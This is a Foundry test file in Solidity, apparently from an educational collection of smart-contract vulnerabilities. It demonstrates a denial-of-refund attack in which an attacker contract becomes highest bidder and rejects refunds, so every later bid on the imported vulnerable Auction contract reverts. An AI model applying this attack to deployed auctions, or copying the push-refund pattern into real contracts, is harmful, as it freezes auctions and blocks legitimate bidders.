pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contracts
import "../src/4.3-Wrong-use-of-Transfer-Credit-Function-vulnerability.sol";

contract AuctionVulnerabilityTest is Test {
    Auction auction;
    Attack attack;

    // Setup: deploy Auction and Attack contracts.
    function setUp() public {
        auction = new Auction();
        attack = new Attack(payable(address(auction)));
    }

    // Test the denial of refund vulnerability
    // Attack contract becomes highest bidder and then rejects refunds,
    // causing subsequent bids to revert.
    function testAttackDenialOfRefund() public {
        // Have the attack contract place a bid of 1 ether.
        // Fund the Attack contract with 1 ether.
        // Note: In Foundry tests, ETH can be sent along with the call even if originating from the test.
        attack.attackBid{value: 1 ether}();

        // Verify that the attack contract is now the highest bidder
        assertEq(auction.highestBidder(), address(attack), "Attack contract should be highest bidder");
        assertEq(auction.highestBid(), 1 ether, "Highest bid should be 1 ether");

        // Prepare a normal bidder account
        address bidder = address(0xBEEF);
        vm.deal(bidder, 2 ether);

        // Now, from the normal bidder, attempt to place a higher bid of 2 ether.
        // Because the attack contract refuses refunds, the refund call in Auction.bid() will revert
        // with the revert message coming from the attack contract's fallback/receive functions.
        vm.prank(bidder);
        vm.expectRevert(bytes("Attack: Rejecting refund"));
        auction.bid{value: 2 ether}();

        // After the failed bid, the highest bidder should remain the attack contract
        assertEq(auction.highestBidder(), address(attack), "Highest bidder should remain attack contract");
        assertEq(auction.highestBid(), 1 ether, "Highest bid should remain 1 ether after failed bid");
    }
}
